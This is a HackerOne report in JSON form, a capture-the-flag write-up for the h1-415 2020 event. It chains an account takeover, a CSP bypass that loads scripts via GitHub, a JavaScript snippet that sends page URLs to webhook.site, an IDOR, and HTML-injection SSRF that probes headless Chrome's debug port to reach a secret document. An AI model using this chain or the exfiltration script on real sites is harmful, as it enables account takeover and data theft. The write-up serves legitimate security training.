{"id":781253,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyNTM=","url":"https://hackerone.com/reports/781253","title":"[h1-415 2020] h1ctf{y3s_1m_c0sm1c_n0w}","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-23T04:45:56.543Z","submitted_at":"2020-01-23T04:45:56.543Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pirateducky","url":"/pirateducky","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T20:48:00.906Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T20:48:00.846Z","team_member_agreed_on_going_public_at":"2020-02-03T20:35:03.985Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n[add summary of the vulnerability]\nAccount takeover was possible because of the email validation used - `jobert@mydocz.cosmic\u003c\u003e{}` could be registered, but when the the system created the recovery `QR` code the extra symbols would get stripped leaving us with a valid recovery `QR` code to log into `jobert@mydocz.cosmic`. Once logged in we had access to the `support` bot (if you left a `1` star review, \"someone\" would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from `https://github.com/mattboldt/typed.js/master/lib/` we found that we could append a github repo to this url and execute it's content `https://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js` you have to remove `/blob/` from the repo url.  Once we had execution we tried to exfiltrate `cookies` and anything we could think of, include `window.location.href` which gives you the current url the user is visiting, we did is using a script that looked like\n```js\nvar image = document.createElement(\"img\")\nvar image.src = \"webhook.site/1234/img.png?url= + window.location.href\ndocument.body.appendChild(image)\n``` \nThis allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` \nOnce you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to \"peek\" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: \n```\nchrome \\\n  --headless \\                   # Runs Chrome in headless mode.\n  --disable-gpu \\                # Temporarily needed if running on Windows.\n  --remote-debugging-port=9222 \\\n  https://www.chromestatus.com   # URL to open. Defaults to about:blank.\n```\n\nWe used that port number like so: `\u003ciframe src='http://localhost:9222 width=900 height=900\u003e\u003c/iframe\u003e` this gave us back: \n\n`Inspectable WebContents`  :( \n\nbut then we tried: `\u003ciframe src='http://localhost:9222/json width=900 height=900\u003e\u003c/iframe\u003e` and....\n\nwe receive a json document with the important part being\n```\nsecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88\"```\n\nif you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\nIt is done! \n\nThank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 \u0026 @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! \n\nThis write up is last minute and it sucks, next time I'll write a better one, this one was all about getting it done.\n\nAgain thank you!\n\n## Impact\n\nWe finished it.\n\nWe got to take over an account and compromise the internal network to retrieve the secret document.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003e[add summary of the vulnerability]\u003cbr\u003e\nAccount takeover was possible because of the email validation used - \u003ccode\u003ejobert@mydocz.cosmic\u0026lt;\u0026gt;{}\u003c/code\u003e could be registered, but when the the system created the recovery \u003ccode\u003eQR\u003c/code\u003e code the extra symbols would get stripped leaving us with a valid recovery \u003ccode\u003eQR\u003c/code\u003e code to log into \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e. Once logged in we had access to the \u003ccode\u003esupport\u003c/code\u003e bot (if you left a \u003ccode\u003e1\u003c/code\u003e star review, \u0026quot;someone\u0026quot; would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from \u003ccode\u003ehttps://github.com/mattboldt/typed.js/master/lib/\u003c/code\u003e we found that we could append a github repo to this url and execute it\u0026#39;s content \u003ccode\u003ehttps://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js\u003c/code\u003e you have to remove \u003ccode\u003e/blob/\u003c/code\u003e from the repo url.  Once we had execution we tried to exfiltrate \u003ccode\u003ecookies\u003c/code\u003e and anything we could think of, include \u003ccode\u003ewindow.location.href\u003c/code\u003e which gives you the current url the user is visiting, we did is using a script that looked like\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eimage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eimg\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esrc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewebhook.site/1234/img.png?url= + window.location.href\ndocument.body.appendChild(image)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis allowed us to get the reviewer link to our conversation: \u003ccode\u003ehttps://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\u003c/code\u003e \u003cbr\u003e\nOnce you had access to the form in the reviews there\u0026#39;s a form the reviewer has access to, to edit the user\u0026#39;s name, this parameter was vulnerable to an IDOR - so you could edit anyone\u0026#39;s name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf\u0026#39;s the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let\u0026#39;s make a request to our server so we can get more information about what\u0026#39;s creating these pdfs, here I used \u003ca title=\"https://ssrftest.com\" href=\"/redirect?url=https%3A%2F%2Fssrftest.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://ssrftest.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to test for SSRF - there\u0026#39;s a payload to use an image and try to get a request back to the server - it works and the header\u0026#39;s that are important to us here are \u003ccode\u003eUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\u003c/code\u003e it tells us this is a headless browser Chrome running on linux, there\u0026#39;s also a \u003ccode\u003eReferer: http://localhost:3000/\u003c/code\u003e so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an \u003ccode\u003eiframe\u003c/code\u003e to \u0026quot;peek\u0026quot; inside the application, trying ports, \u003ccode\u003e80\u003c/code\u003e returned \u003ccode\u003eFORBIDDEN\u003c/code\u003e and everything else we tried was blank, and then I remembered this was using \u003ccode\u003eheadless Chrome\u003c/code\u003e so I used my google-fu and searched for \u003ccode\u003eheadless chrome port number\u003c/code\u003e and the results were promising: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003echrome \\\n  --headless \\                   # Runs Chrome in headless mode.\n  --disable-gpu \\                # Temporarily needed if running on Windows.\n  --remote-debugging-port=9222 \\\n  https://www.chromestatus.com   # URL to open. Defaults to about:blank.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe used that port number like so: \u003ccode\u003e\u0026lt;iframe src=\u0026#39;http://localhost:9222 width=900 height=900\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e this gave us back: \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eInspectable WebContents\u003c/code\u003e  :( \u003c/p\u003e\n\n\u003cp\u003ebut then we tried: \u003ccode\u003e\u0026lt;iframe src=\u0026#39;http://localhost:9222/json width=900 height=900\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e and....\u003c/p\u003e\n\n\u003cp\u003ewe receive a json document with the important part being\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\u0026quot;,   \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88\u0026quot;```\n\nif you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\nIt is done! \n\nThank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 \u0026amp; @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! \n\nThis write up is last minute and it sucks, next time I\u0026#39;ll write a better one, this one was all about getting it done.\n\nAgain thank you!\n\n## Impact\n\nWe finished it.\n\nWe got to take over an account and compromise the internal network to retrieve the secret document.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":693486,"file_name":"Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SFCdWcKSFNgy2S4tQY2RDuNt?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZJO3526D%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065116Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIvMo8EBz315uHyZU%2FDG0Huf%2BYKjgYY96exJvyGCLJ6QIgTS1mW%2Fy84%2BDNAkhNbJC8Lysp3409zBR1BXDeS%2BTYRyoqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDEH1nkH4bxOL%2FzZVaiqRAz36Ga68aNU0H93UvEuRIu3bWdCaX174NDGE9HjZ6%2FIGHIDSo8%2BrgJclDinDvb%2Bz5hmDmKwxsZWntb8C077ZNi40vSm3S2BX7TIgKs7OdhHPP26QN5RZDLBCOd0pFTN5ykSL4WFPtakUEHIG05D09oYImqFNistW6N3pBf2hsoRXecWNFI7qMU5wkBMwH2QMBKxqwWAWEAbH6%2Bm%2FxceXV1a8FnL9d8Uhq%2F2Q494%2BZl8MTPuGY7b8f24oQWse7cwMUzvDfqk5TkNfLVSGvrldYvDZ5%2BxCgwagxuwM5onXgbXJ4rRlwsCuZjULhImoKeNv96uim58dbOdKVASQ6GndH5Nrd3tU1KMMgE8wulU71dP4zkXeWt6gi59gtfTvslGO582avOHZUkGIulK7r7JD3t1kTj7U8QaLGPznBskRPSjpug5C4fTdunIrlWgxxYPRSkn61QPQIYfO5cT0HvlOlcuNwaVarnH6q4OXAnE%2BiCH6ODeGHFc%2FbpDT1S1H%2FhTwMOseCmH6rpa9zpdueGS1v945MK%2F9qv8FOusBHn%2BLyL3HJMADkT5J%2FQsL%2Bm415pbG%2FB7sn6BT00QcjPotU4hSnic44MJSPfUmiSKj6d9gLy1f6TEKMFDfJSsENQ%2FaA%2FcWdZKIurcEqINLaFCH7pBgplCMxWUAgnjBUSd4R3H7RrO8ZQbJ3mfz5fAyaFiog5eNoktqTPC5U6knr6J5p0BqQz3pjKkZdFIlUKqlFwECcnX15GzWTOONLY2H8vGW7f3Jzu30NgpDT7w1IP4BRoOJg0NZFk0VVeK%2BYFVc3To9CA8AHQuJZBmtD%2B3SdCh%2FxMl87xH6SWR8e4W2edgavCy2dBUw0YFKbw%3D%3D\u0026X-Amz-Signature=da7a5acda4d1093696509e70740338719999441f575642ae4b12e1b9c01ae12e","file_size":387271,"type":"image/png"}],"allow_singular_disclosure_at":"2020-03-04T20:35:04.150Z","allow_singular_disclosure_after":-25870572.585095625,"singular_disclosure_allowed":true,"vote_count":16,"voters":["nytr0gen","checkm50","pirateducky","0xacb","sameerphad72","nukedx","w2w","rhinestonecowboy","realtess","exadmin","and 6 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6847412,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Excellent! Thanks for playing! ","markdown_message":"\u003cp\u003eExcellent! Thanks for playing! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T07:13:23.525Z","updated_at":"2020-01-23T07:13:23.525Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6852646,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.590Z","updated_at":"2020-01-23T18:13:03.590Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934810,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.266Z","updated_at":"2020-01-31T18:04:59.266Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6935035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":":) thanks for the update! ","markdown_message":"\u003cp\u003e:) thanks for the update! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:36:16.831Z","updated_at":"2020-01-31T18:36:16.831Z","actor":{"username":"pirateducky","cleared":false,"url":"/pirateducky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6953837,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.398Z","updated_at":"2020-02-03T20:32:39.398Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"pirateducky","url":"/pirateducky"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953855,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:35:04.010Z","updated_at":"2020-02-03T20:35:04.010Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954006,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:48:00.865Z","updated_at":"2020-02-03T20:48:00.865Z","actor":{"username":"pirateducky","cleared":false,"url":"/pirateducky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954007,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:48:00.928Z","updated_at":"2020-02-03T20:48:00.928Z","actor":{"username":"pirateducky","cleared":false,"url":"/pirateducky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236811,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:55.004Z","updated_at":"2020-06-08T21:12:55.004Z","additional_data":{"old_title":"h1ctf{y3s_1m_c0sm1c_n0w}","new_title":"[h1-415 2020] h1ctf{y3s_1m_c0sm1c_n0w}"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":20046,"category":"researcher","content":"Account take over =\u003e CSP bypass to execute javascript =\u003e IDOR =\u003e Access to internal network =\u003e access to debugging on headless Chrome.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAccount take over =\u0026gt; CSP bypass to execute javascript =\u0026gt; IDOR =\u0026gt; Access to internal network =\u0026gt; access to debugging on headless Chrome.\u003c/p\u003e\n"}]}